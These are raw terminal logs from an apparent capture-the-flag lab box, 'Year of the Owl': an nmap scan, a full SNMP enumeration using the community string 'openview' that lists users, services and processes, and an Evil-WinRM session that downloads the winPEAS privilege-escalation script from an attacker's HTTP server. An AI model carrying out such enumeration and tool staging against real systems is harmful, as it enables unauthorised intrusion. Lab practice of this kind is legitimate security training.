```
Starting Nmap 7.94 ( https://nmap.org ) at 2025-09-06 10:21 EDT
Nmap scan report for 10.10.59.17
Host is up (0.023s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-title: Year of the Owl
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Year of the Owl
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL, oracle-tns: 
|_    Host 'ip-10-8-117-56.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-06T14:21:30+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94%I=7%D=9/6%Time=68BC435D%P=x86_64-pc-linux-gnu%r(NUL
SF:L,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-117-56\.eu-west-1\.compute\.in
SF:ternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Maria
SF:DB\x20server")%r(oracle-tns,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-117-
SF:56\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-06T14:21:31
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.63 seconds

```

```
┌──(kali㉿kali)-[~]
└─$ snmp-check 10.10.224.65 -c openview
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.224.65:161 using SNMPv1 and community 'openview'

[*] System information:

  Host IP address               : 10.10.224.65
  Hostname                      : year-of-the-owl
  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
  Contact                       : -
  Location                      : -
  Uptime snmp                   : 00:37:26.37
  Uptime system                 : 00:36:48.99
  System date                   : 2025-9-20 15:28:16.6
  Domain                        : WORKGROUP

[*] User accounts:

  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount  

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 292
  TCP segments sent             : 479
  TCP segments retrans          : 231
  Input datagrams               : 3569
  Delivered datagrams           : 3660
  Output datagrams              : 635

[*] Network interfaces:

  Interface                     : [ up ] Software Loopback Interface 1
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 1073 Mbps
  MTU                           : 1500
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft 6to4 Adapter
  Id                            : 2
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft IP-HTTPS Platform Adapter
  Id                            : 3
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Kernel Debug Network Adapter
  Id                            : 4
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Intel(R) 82574L Gigabit Network Connection
  Id                            : 5
  Mac Address                   : 00:0c:29:02:45:89
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Teredo Tunneling Adapter
  Id                            : 6
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] AWS PV Network Device #0
  Id                            : 7
  Mac Address                   : 02:05:da:d2:21:11
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 319032
  Out octets                    : 321960

  Interface                     : [ up ] AWS PV Network Device #0-WFP Native MAC Layer LightWeight Filter-0000
  Id                            : 8
  Mac Address                   : 02:05:da:d2:21:11
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 319032
  Out octets                    : 321960

  Interface                     : [ up ] AWS PV Network Device #0-QoS Packet Scheduler-0000
  Id                            : 9
  Mac Address                   : 02:05:da:d2:21:11
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 319032
  Out octets                    : 321960

  Interface                     : [ up ] AWS PV Network Device #0-WFP 802.3 MAC Layer LightWeight Filter-0000
  Id                            : 10
  Mac Address                   : 02:05:da:d2:21:11
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 319032
  Out octets                    : 321960


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  7                     10.10.224.65          255.255.0.0           1                   
  1                     127.0.0.1             255.0.0.0             1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.10.0.1             0.0.0.0               25                  
  10.10.0.0             10.10.224.65          255.255.0.0           281                 
  10.10.224.65          10.10.224.65          255.255.255.255       281                 
  10.10.255.255         10.10.224.65          255.255.255.255       281                 
  127.0.0.0             127.0.0.1             255.0.0.0             331                 
  127.0.0.1             127.0.0.1             255.255.255.255       331                 
  127.255.255.255       127.0.0.1             255.255.255.255       331                 
  169.254.169.123       10.10.0.1             255.255.255.255       50                  
  169.254.169.249       10.10.0.1             255.255.255.255       50                  
  169.254.169.250       10.10.0.1             255.255.255.255       50                  
  169.254.169.251       10.10.0.1             255.255.255.255       50                  
  169.254.169.253       10.10.0.1             255.255.255.255       50                  
  169.254.169.254       10.10.0.1             255.255.255.255       50                  
  224.0.0.0             127.0.0.1             240.0.0.0             331                 
  255.255.255.255       127.0.0.1             255.255.255.255       331                 

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               135                   0.0.0.0               0                     listen              
  0.0.0.0               443                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               3306                  0.0.0.0               0                     listen              
  0.0.0.0               3389                  0.0.0.0               0                     listen              
  0.0.0.0               5985                  0.0.0.0               0                     listen              
  0.0.0.0               47001                 0.0.0.0               0                     listen              
  0.0.0.0               49664                 0.0.0.0               0                     listen              
  0.0.0.0               49665                 0.0.0.0               0                     listen              
  0.0.0.0               49666                 0.0.0.0               0                     listen              
  0.0.0.0               49667                 0.0.0.0               0                     listen              
  0.0.0.0               49668                 0.0.0.0               0                     listen              
  0.0.0.0               49670                 0.0.0.0               0                     listen              
  10.10.224.65          139                   0.0.0.0               0                     listen              
  10.10.224.65          49802                 20.165.94.63          443                   synSent             
  10.10.224.65          49803                 2.18.238.120          443                   synSent             

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               123                 
  0.0.0.0               161                 
  0.0.0.0               3389                
  0.0.0.0               5353                
  0.0.0.0               5355                
  10.10.224.65          137                 
  10.10.224.65          138                 
  127.0.0.1             52155               

[*] Network services:

  Index                 Name                
  0                     Power               
  1                     mysql               
  2                     Server              
  3                     Themes              
  4                     SysMain             
  5                     Apache2.4           
  6                     IP Helper           
  7                     DNS Client          
  8                     DHCP Client         
  9                     Time Broker         
  10                    Workstation         
  11                    SNMP Service        
  12                    User Manager        
  13                    Windows Time        
  14                    CoreMessaging       
  15                    Plug and Play       
  16                    Print Spooler       
  17                    Task Scheduler      
  18                    Windows Update      
  19                    Amazon SSM Agent    
  20                    CNG Key Isolation   
  21                    COM+ Event System   
  22                    Windows Event Log   
  23                    IPsec Policy Agent  
  24                    Group Policy Client 
  25                    RPC Endpoint Mapper 
  26                    Web Account Manager 
  27                    AWS Lite Guest Agent
  28                    Data Sharing Service
  29                    Device Setup Manager
  30                    Network List Service
  31                    System Events Broker
  32                    User Profile Service
  33                    Base Filtering Engine
  34                    Local Session Manager
  35                    TCP/IP NetBIOS Helper
  36                    Cryptographic Services
  37                    Application Information
  38                    Certificate Propagation
  39                    Remote Desktop Services
  40                    Shell Hardware Detection
  41                    Diagnostic Policy Service
  42                    Network Connection Broker
  43                    Security Accounts Manager
  44                    Windows Defender Firewall
  45                    Windows Modules Installer
  46                    Network Location Awareness
  47                    Windows Connection Manager
  48                    Windows Font Cache Service
  49                    Remote Procedure Call (RPC)
  50                    Update Orchestrator Service
  51                    User Access Logging Service
  52                    DCOM Server Process Launcher
  53                    Microsoft Storage Spaces SMP
  54                    Remote Desktop Configuration
  55                    Network Store Interface Service
  56                    Client License Service (ClipSVC)
  57                    Distributed Link Tracking Client
  58                    AppX Deployment Service (AppXSVC)
  59                    System Event Notification Service
  60                    Connected Devices Platform Service
  61                    Windows Defender Antivirus Service
  62                    Windows Management Instrumentation
  63                    Distributed Transaction Coordinator
  64                    Microsoft Account Sign-in Assistant
  65                    Background Tasks Infrastructure Service
  66                    Connected User Experiences and Telemetry
  67                    WinHTTP Web Proxy Auto-Discovery Service
  68                    Windows Push Notifications System Service
  69                    Windows Remote Management (WS-Management)
  70                    Remote Desktop Services UserMode Port Redirector
  71                    Windows Defender Antivirus Network Inspection Service

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     running               System Idle Process                                             
  4                     running               System                                                          
  68                    running               Registry                                                        
  416                   running               smss.exe                                                        
  520                   running               dwm.exe                                                         
  580                   running               svchost.exe           C:\Windows\System32\  -k smphost          
  584                   running               csrss.exe                                                       
  660                   running               csrss.exe                                                       
  676                   running               wininit.exe                                                     
  720                   running               winlogon.exe                                                    
  784                   running               services.exe                                                    
  800                   running               lsass.exe             C:\Windows\system32\                      
  844                   running               svchost.exe           C:\Windows\system32\  -k netsvcs -p       
  904                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch -p    
  912                   running               ngentask.exe          C:\Windows\Microsoft.NET\Framework64\v4.0.30319\  /RuntimeWide /StopEvent:1032
  916                   running               svchost.exe           C:\Windows\System32\  -k termsvcs         
  928                   running               fontdrvhost.exe                                                 
  936                   running               fontdrvhost.exe                                                 
  1000                  running               svchost.exe           C:\Windows\system32\  -k RPCSS -p         
  1012                  running               svchost.exe                                                     
  1032                  running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted -p
  1048                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted -p
  1200                  running               svchost.exe           C:\Windows\system32\  -k LocalService -p  
  1288                  running               amazon-ssm-agent.exe  C:\Program Files\Amazon\SSM\                      
  1292                  running               svchost.exe           C:\Windows\System32\  -k NetworkService -p
  1324                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted -p
  1384                  running               LiteAgent.exe         C:\Program Files\Amazon\XenTools\                      
  1452                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetworkFirewall -p
  1472                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork -p
  1616                  running               MpCmdRun.exe          C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\  SignaturesUpdateService -ScheduleJob -HttpDownload -RestrictPrivileges -Reinvoke
  1700                  running               svchost.exe           C:\Windows\system32\  -k netsvcs          
  1852                  running               spoolsv.exe           C:\Windows\System32\                      
  1888                  running               msdtc.exe             C:\Windows\System32\                      
  1896                  running               svchost.exe           C:\Windows\System32\  -k utcsvc -p        
  1968                  running               svchost.exe           C:\Windows\system32\  -k LocalService     
  2000                  running               snmp.exe              C:\Windows\System32\                      
  2028                  running               MsMpEng.exe                                                     
  2044                  running               httpd.exe             C:\xampp\apache\bin\  -k runservice       
  2056                  running               mysqld.exe            C:\xampp\mysql\bin\   --defaults-file=c:\xampp\mysql\bin\my.ini mysql
  2088                  running               svchost.exe           C:\Windows\System32\  -k smbsvcs          
  2116                  running               MpCmdRun.exe          C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\  SignatureUpdate -ScheduleJob -RestrictPrivileges -Reinvoke
  2136                  running               httpd.exe             C:\xampp\apache\bin\  -d C:/xampp/apache  
  2228                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted -p
  2548                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  2696                  running               TiWorker.exe          C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.1450_none_56e6965b991df4af\  -Embedding          
  3016                  running               LogonUI.exe                                 /flags:0x2 /state0:0xa3a7d055 /state1:0x41c64e6d
  3512                  running               mscorsvw.exe          C:\Windows\Microsoft.NET\Framework64\v4.0.30319\  -StartupEvent 324 -InterruptEvent 0 -NGENProcess 2c8 -Pipe 1a8 -Comment "NGen Worker Process"
  3820                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  3848                  running               MpCmdRun.exe          C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\  -IdleTask -TaskName WdCacheMaintenance
  3856                  running               TrustedInstaller.exe  C:\Windows\servicing\                      
  3968                  running               NisSrv.exe                                                      
  4128                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\                      
  4172                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  4256                  running               ngen.exe              C:\Windows\Microsoft.NET\Framework64\v4.0.30319\  ExecuteQueuedItems /LegacyServiceBehavior
  4344                  running               taskhostw.exe                               /RuntimeWide        
  4572                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  4580                  running               CompatTelRunner.exe   C:\Windows\system32\  -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:cs3dL4nr5UyY5kf0.2
  4692                  running               ngen.exe              C:\Windows\Microsoft.NET\Framework\v4.0.30319\  ExecuteQueuedItems /LegacyServiceBehavior
  4848                  running               CompatTelRunner.exe   C:\Windows\system32\  -maintenance        
  5100                  running               ngentask.exe          C:\Windows\Microsoft.NET\Framework\v4.0.30319\  /RuntimeWide /StopEvent:1044

[*] Storage information:

  Description                   : ["C:\\ Label:  Serial Number 7c0c3814"]
  Device id                     : [#<SNMP::Integer:0x00007f8489b3f410 @value=1>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f8489b42ef8 @value=4096>]
  Memory size                   : 19.46 GB
  Memory used                   : 15.69 GB

  Description                   : ["Virtual Memory"]
  Device id                     : [#<SNMP::Integer:0x00007f8489b74d40 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f8489b7f0d8 @value=65536>]
  Memory size                   : 3.12 GB
  Memory used                   : 1.53 GB

  Description                   : ["Physical Memory"]
  Device id                     : [#<SNMP::Integer:0x00007f8489667550 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007f8489665890 @value=65536>]
  Memory size                   : 2.00 GB
  Memory used                   : 1.53 GB


[*] File system information:

  Index                         : 1
  Mount point                   : 
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 0

[*] Device information:

  Id                    Type                  Status                Descr               
  1                     unknown               running               Microsoft XPS Document Writer v4
  2                     unknown               running               Microsoft Print To PDF
  3                     unknown               running               Unknown Processor Type
  4                     unknown               unknown               Software Loopback Interface 1
  5                     unknown               unknown               Microsoft 6to4 Adapter
  6                     unknown               unknown               Microsoft IP-HTTPS Platform Adapter
  7                     unknown               unknown               Microsoft Kernel Debug Network Adapter
  8                     unknown               unknown               Intel(R) 82574L Gigabit Network Connection
  9                     unknown               unknown               Microsoft Teredo Tunneling Adapter
  10                    unknown               unknown               AWS PV Network Device #0
  11                    unknown               unknown               AWS PV Network Device #0-WFP Native MAC Layer LightWeight Filter
  12                    unknown               unknown               AWS PV Network Device #0-QoS Packet Scheduler-0000
  13                    unknown               unknown               AWS PV Network Device #0-WFP 802.3 MAC Layer LightWeight Filter-
  14                    unknown               running               Fixed Disk          
  15                    unknown               running               Fixed Disk          
  16                    unknown               running               IBM enhanced (101- or 102-key) keyboard, Subtype=(0)
  17                    unknown               unknown               COM1:               

[*] Software components:

  Index                 Name                
  1                     XAMPP               
  2                     Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.11.25325
  3                     Microsoft Visual C++ 2017 x64 Additional Runtime - 14.11.25325
  4                     Amazon SSM Agent    
  5                     Amazon SSM Agent    
  6                     Microsoft Visual C++ 2017 Redistributable (x64) - 14.11.25325

```

```
*Evil-WinRM* PS C:\Users\Jareth\Desktop> iwr http://10.8.117.56:8000/winPEAS.ps1


StatusCode        : 200
StatusDescription : OK
Content           : {10, 10, 10, 10...}
RawContent        : HTTP/1.0 200 OK
                    Content-Length: 379740
                    Content-Type: application/octet-stream
                    Date: Sun, 21 Sep 2025 16:20:02 GMT
                    Last-Modified: Sat, 24 May 2025 13:36:22 GMT
                    Server: SimpleHTTP/0.6 Python/3.11.4...
Headers           : {[Content-Length, 379740], [Content-Type, application/octet-stream], [Date, Sun, 21 Sep 2025 16:20:02 GMT], [Last-Modified, Sat, 24 May 2025 13:36:22 GMT]...}
RawContentLength  : 379740
```

